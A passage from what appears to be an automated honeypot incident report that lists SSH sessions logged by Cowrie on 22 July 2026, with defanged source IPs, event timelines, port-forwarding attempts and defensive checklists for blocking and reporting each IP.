- [ ] Block `93.241.232[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-858757a2dba7

| Field | Detail |
|---|---|
| **Source IP** | `62.122.195[.]14` |
| **First Seen** | 2026-07-22 21:29 |
| **Last Seen** | 2026-07-22 21:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:29:39` | `cowrie.session.connect` |
| `2026-07-22 21:29:40` | `cowrie.client.version` |
| `2026-07-22 21:29:40` | `cowrie.client.kex` |
| `2026-07-22 21:29:41` | `cowrie.login.success` |
| `2026-07-22 21:29:41` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.122.195[.]14` to AbuseIPDB if not already reported
- [ ] Block `62.122.195[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3edd4c368c9b

| Field | Detail |
|---|---|
| **Source IP** | `112.196.52[.]107` |
| **First Seen** | 2026-07-22 21:32 |
| **Last Seen** | 2026-07-22 21:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:32:45` | `cowrie.session.connect` |
| `2026-07-22 21:32:46` | `cowrie.client.version` |
| `2026-07-22 21:32:46` | `cowrie.client.kex` |
| `2026-07-22 21:32:48` | `cowrie.login.success` |
| `2026-07-22 21:32:48` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.196.52[.]107` to AbuseIPDB if not already reported
- [ ] Block `112.196.52[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b22964cd66c

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-22 21:32 |
| **Last Seen** | 2026-07-22 21:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:32:54` | `cowrie.session.connect` |
| `2026-07-22 21:32:54` | `cowrie.client.version` |
| `2026-07-22 21:32:54` | `cowrie.client.kex` |
| `2026-07-22 21:32:56` | `cowrie.login.success` |
| `2026-07-22 21:32:57` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f65e4c5a4cb8

| Field | Detail |
|---|---|
| **Source IP** | `211.247.127[.]250` |
| **First Seen** | 2026-07-22 21:34 |
| **Last Seen** | 2026-07-22 21:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:34:31` | `cowrie.session.connect` |
| `2026-07-22 21:34:32` | `cowrie.client.version` |
| `2026-07-22 21:34:32` | `cowrie.client.kex` |
| `2026-07-22 21:34:34` | `cowrie.login.success` |
| `2026-07-22 21:34:35` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.247.127[.]250` to AbuseIPDB if not already reported
- [ ] Block `211.247.127[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8891297404e

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]123` |
| **First Seen** | 2026-07-22 21:34 |
| **Last Seen** | 2026-07-22 21:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:34:40` | `cowrie.session.connect` |
| `2026-07-22 21:34:41` | `cowrie.client.version` |
| `2026-07-22 21:34:41` | `cowrie.client.kex` |
| `2026-07-22 21:34:42` | `cowrie.login.success` |
| `2026-07-22 21:34:43` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:34:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]123` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3d3e0dd0115

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 21:35 |
| **Last Seen** | 2026-07-22 21:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:35:03` | `cowrie.session.connect` |
| `2026-07-22 21:35:03` | `cowrie.client.version` |
| `2026-07-22 21:35:03` | `cowrie.client.kex` |
| `2026-07-22 21:35:03` | `cowrie.login.success` |
| `2026-07-22 21:35:04` | `cowrie.session.params` |
| `2026-07-22 21:35:04` | `cowrie.command.input` |
| `2026-07-22 21:35:04` | `cowrie.log.closed` |
| `2026-07-22 21:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63eadc3d43be

| Field | Detail |
|---|---|
| **Source IP** | `111.193.181[.]226` |
| **First Seen** | 2026-07-22 21:38 |
| **Last Seen** | 2026-07-22 21:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:38:10` | `cowrie.session.connect` |
| `2026-07-22 21:38:10` | `cowrie.client.version` |
| `2026-07-22 21:38:10` | `cowrie.client.kex` |
| `2026-07-22 21:38:12` | `cowrie.login.success` |
| `2026-07-22 21:38:13` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.193.181[.]226` to AbuseIPDB if not already reported
- [ ] Block `111.193.181[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-603f5e358bea

| Field | Detail |
|---|---|
| **Source IP** | `49.124.150[.]248` |
| **First Seen** | 2026-07-22 21:38 |
| **Last Seen** | 2026-07-22 21:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:38:22` | `cowrie.session.connect` |
| `2026-07-22 21:38:23` | `cowrie.client.version` |
| `2026-07-22 21:38:23` | `cowrie.client.kex` |
| `2026-07-22 21:38:25` | `cowrie.login.success` |
| `2026-07-22 21:38:26` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.150[.]248` to AbuseIPDB if not already reported
- [ ] Block `49.124.150[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd90b6c9929

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-22 21:38 |
| **Last Seen** | 2026-07-22 21:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:38:40` | `cowrie.session.connect` |
| `2026-07-22 21:38:40` | `cowrie.client.version` |
| `2026-07-22 21:38:40` | `cowrie.client.kex` |
| `2026-07-22 21:38:40` | `cowrie.login.success` |
| `2026-07-22 21:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-271d239bda26

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-22 21:38 |
| **Last Seen** | 2026-07-22 21:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:38:41` | `cowrie.session.connect` |
| `2026-07-22 21:38:41` | `cowrie.client.version` |
| `2026-07-22 21:38:41` | `cowrie.client.kex` |
| `2026-07-22 21:38:41` | `cowrie.login.success` |
| `2026-07-22 21:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01fc50f789d7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-22 21:38 |
| **Last Seen** | 2026-07-22 21:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:38:43` | `cowrie.session.connect` |
| `2026-07-22 21:38:43` | `cowrie.client.version` |
| `2026-07-22 21:38:43` | `cowrie.client.kex` |
| `2026-07-22 21:38:43` | `cowrie.login.success` |
| `2026-07-22 21:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7221b01f8440

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-22 21:38 |
| **Last Seen** | 2026-07-22 21:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:38:43` | `cowrie.session.connect` |
| `2026-07-22 21:38:43` | `cowrie.client.version` |
| `2026-07-22 21:38:43` | `cowrie.client.kex` |
| `2026-07-22 21:38:43` | `cowrie.login.success` |
| `2026-07-22 21:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c003738cd4b

| Field | Detail |
|---|---|
| **Source IP** | `85.159.164[.]28` |
| **First Seen** | 2026-07-22 21:41 |
| **Last Seen** | 2026-07-22 21:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:41:38` | `cowrie.session.connect` |
| `2026-07-22 21:41:38` | `cowrie.client.version` |
| `2026-07-22 21:41:38` | `cowrie.client.kex` |
| `2026-07-22 21:41:40` | `cowrie.login.success` |
| `2026-07-22 21:41:40` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.159.164[.]28` to AbuseIPDB if not already reported
- [ ] Block `85.159.164[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5164f66f2308

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 21:42 |
| **Last Seen** | 2026-07-22 21:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:42:27` | `cowrie.session.connect` |
| `2026-07-22 21:42:27` | `cowrie.client.version` |
| `2026-07-22 21:42:27` | `cowrie.client.kex` |
| `2026-07-22 21:42:27` | `cowrie.login.success` |
| `2026-07-22 21:42:28` | `cowrie.session.params` |
| `2026-07-22 21:42:28` | `cowrie.command.input` |
| `2026-07-22 21:42:28` | `cowrie.log.closed` |
| `2026-07-22 21:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27e22dfddf40

| Field | Detail |
|---|---|
| **Source IP** | `12.125.34[.]242` |
| **First Seen** | 2026-07-22 21:44 |
| **Last Seen** | 2026-07-22 21:46 |
| **Session Duration** | 70s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:44:53` | `cowrie.session.connect` |
| `2026-07-22 21:44:55` | `cowrie.client.version` |
| `2026-07-22 21:44:55` | `cowrie.client.kex` |
| `2026-07-22 21:45:46` | `cowrie.login.success` |
| `2026-07-22 21:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `12.125.34[.]242` to AbuseIPDB if not already reported
- [ ] Block `12.125.34[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f762f674b749

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-22 21:46 |
| **Last Seen** | 2026-07-22 21:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:46:21` | `cowrie.session.connect` |
| `2026-07-22 21:46:21` | `cowrie.client.version` |
| `2026-07-22 21:46:21` | `cowrie.client.kex` |
| `2026-07-22 21:46:21` | `cowrie.login.success` |
| `2026-07-22 21:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3108908dd9e

| Field | Detail |
|---|---|
| **Source IP** | `61.143.227[.]17` |
| **First Seen** | 2026-07-22 21:53 |
| **Last Seen** | 2026-07-22 21:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:53:27` | `cowrie.session.connect` |
| `2026-07-22 21:53:28` | `cowrie.client.version` |
| `2026-07-22 21:53:28` | `cowrie.client.kex` |
| `2026-07-22 21:53:30` | `cowrie.login.success` |
| `2026-07-22 21:53:30` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.143.227[.]17` to AbuseIPDB if not already reported
- [ ] Block `61.143.227[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5831400dc5ea

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]26` |
| **First Seen** | 2026-07-22 21:53 |
| **Last Seen** | 2026-07-22 21:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:53:46` | `cowrie.session.connect` |
| `2026-07-22 21:53:47` | `cowrie.client.version` |
| `2026-07-22 21:53:47` | `cowrie.client.kex` |
| `2026-07-22 21:53:49` | `cowrie.login.success` |
| `2026-07-22 21:53:50` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d84b143b9715

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-07-22 21:53 |
| **Last Seen** | 2026-07-22 21:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:53:59` | `cowrie.session.connect` |
| `2026-07-22 21:54:00` | `cowrie.client.version` |
| `2026-07-22 21:54:00` | `cowrie.client.kex` |
| `2026-07-22 21:54:02` | `cowrie.login.success` |
| `2026-07-22 21:54:03` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-437084d52ac6

| Field | Detail |
|---|---|
| **Source IP** | `222.92.61[.]242` |
| **First Seen** | 2026-07-22 21:54 |
| **Last Seen** | 2026-07-22 21:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:54:21` | `cowrie.session.connect` |
| `2026-07-22 21:54:22` | `cowrie.client.version` |
| `2026-07-22 21:54:22` | `cowrie.client.kex` |
| `2026-07-22 21:54:24` | `cowrie.login.success` |
| `2026-07-22 21:54:25` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.92.61[.]242` to AbuseIPDB if not already reported
- [ ] Block `222.92.61[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d0b36bfb49b

| Field | Detail |
|---|---|
| **Source IP** | `124.67.120[.]106` |
| **First Seen** | 2026-07-22 21:54 |
| **Last Seen** | 2026-07-22 21:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:54:35` | `cowrie.session.connect` |
| `2026-07-22 21:54:35` | `cowrie.client.version` |
| `2026-07-22 21:54:35` | `cowrie.client.kex` |
| `2026-07-22 21:54:38` | `cowrie.login.success` |
| `2026-07-22 21:54:39` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.67.120[.]106` to AbuseIPDB if not already reported
- [ ] Block `124.67.120[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-701cda171f13

| Field | Detail |
|---|---|
| **Source IP** | `177.174.89[.]99` |
| **First Seen** | 2026-07-22 21:56 |
| **Last Seen** | 2026-07-22 21:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:56:52` | `cowrie.session.connect` |
| `2026-07-22 21:56:52` | `cowrie.client.version` |
| `2026-07-22 21:56:52` | `cowrie.client.kex` |
| `2026-07-22 21:56:54` | `cowrie.login.success` |
| `2026-07-22 21:56:54` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.89[.]99` to AbuseIPDB if not already reported
- [ ] Block `177.174.89[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f68f9baa40

| Field | Detail |
|---|---|
| **Source IP** | `218.202.143[.]68` |
| **First Seen** | 2026-07-22 21:57 |
| **Last Seen** | 2026-07-22 21:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:57:00` | `cowrie.session.connect` |
| `2026-07-22 21:57:00` | `cowrie.client.version` |
| `2026-07-22 21:57:00` | `cowrie.client.kex` |
| `2026-07-22 21:57:03` | `cowrie.login.success` |
| `2026-07-22 21:57:03` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.143[.]68` to AbuseIPDB if not already reported
- [ ] Block `218.202.143[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-060df681fe24

| Field | Detail |
|---|---|
| **Source IP** | `218.70.9[.]114` |
| **First Seen** | 2026-07-22 21:57 |
| **Last Seen** | 2026-07-22 21:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 21:57:27` | `cowrie.session.connect` |
| `2026-07-22 21:57:28` | `cowrie.client.version` |
| `2026-07-22 21:57:28` | `cowrie.client.kex` |
| `2026-07-22 21:57:30` | `cowrie.login.success` |
| `2026-07-22 21:57:30` | `cowrie.direct-tcpip.request` |
| `2026-07-22 21:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.70.9[.]114` to AbuseIPDB if not already reported
- [ ] Block `218.70.9[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c49f97def862

| Field | Detail |
|---|---|
| **Source IP** | `111.70.10[.]15` |
| **First Seen** | 2026-07-22 22:02 |
| **Last Seen** | 2026-07-22 22:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:02:14` | `cowrie.session.connect` |
| `2026-07-22 22:02:15` | `cowrie.client.version` |
| `2026-07-22 22:02:15` | `cowrie.client.kex` |
| `2026-07-22 22:02:17` | `cowrie.login.success` |
| `2026-07-22 22:02:17` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.10[.]15` to AbuseIPDB if not already reported
- [ ] Block `111.70.10[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-474efeac628e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-22 22:03 |
| **Last Seen** | 2026-07-22 22:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:03:29` | `cowrie.session.connect` |
| `2026-07-22 22:03:29` | `cowrie.client.version` |
| `2026-07-22 22:03:29` | `cowrie.client.kex` |
| `2026-07-22 22:03:30` | `cowrie.login.success` |
| `2026-07-22 22:03:30` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:03:30` | `cowrie.direct-tcpip.data` |
| `2026-07-22 22:03:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0be208e480e9

| Field | Detail |
|---|---|
| **Source IP** | `165.154.254[.]143` |
| **First Seen** | 2026-07-22 22:04 |
| **Last Seen** | 2026-07-22 22:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
